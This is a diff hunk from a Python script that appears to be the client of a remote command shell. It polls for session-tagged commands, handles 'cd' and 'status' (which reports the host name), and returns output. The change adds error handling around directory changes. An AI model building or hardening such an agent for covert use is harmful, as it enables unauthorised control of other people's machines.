@@ -178,8 +178,11 @@ while(True == True):
         if(len(response)>0):
             if(response[0]['input'][:3] == "cd "):
                 sendOutput(session_id, response[0]['session_id'], "Changing directory...", False)
-                os.chdir(response[0]['input'][3:])
-                sendOutput(session_id, response[0]['session_id'], "Actual directory: "+getPath(), True)
+                try:
+                    os.chdir(response[0]['input'][3:])
+                    sendOutput(session_id, response[0]['session_id'], "Actual directory: "+getPath(), True)
+                except:
+                    sendOutput(session_id, response[0]['session_id'], "Failed to change directory", True)
             else:
                 if(response[0]['input'] == "status"):
                     output = "Host computername : "+os.environ['COMPUTERNAME']
